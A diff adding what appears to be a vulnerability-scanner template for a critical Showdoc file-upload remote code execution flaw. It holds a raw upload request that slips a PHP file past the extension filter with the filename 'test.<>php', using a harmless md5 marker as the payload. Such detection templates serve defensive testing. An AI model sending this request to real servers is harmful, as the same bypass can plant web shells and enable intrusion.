@@ -1,0 +1,49 @@
+id: showdoc-file-upload-rce
+
+info:
+  name: Showdoc <2.8.6 - Remote Code Execution
+  author: pikpikcu
+  severity: critical
+  description: |
+    Showdoc versions before 2.8.6 is susceptible to remote code execution.
+  reference:
+    - https://github.com/star7th/showdoc/pull/1059
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10.0
+    cwe-id: CWE-77
+  tags: rce,fileupload,showdoc,oss,intrusive
+
+requests:
+  - raw:
+      - |
+        POST /index.php?s=/home/page/uploadImg HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=--------------------------835846770881083140190633
+
+        ----------------------------835846770881083140190633
+        Content-Disposition: form-data; name="editormd-image-file"; filename="test.<>php"
+        Content-Type: text/plain
+
+        <?php echo md5('rce_test');?>
+        ----------------------------835846770881083140190633--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"url":"http:'
+          - '"success":1'
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: json
+        json:
+          - '.url'
+
+# Enhanced by mp on 2022/05/30
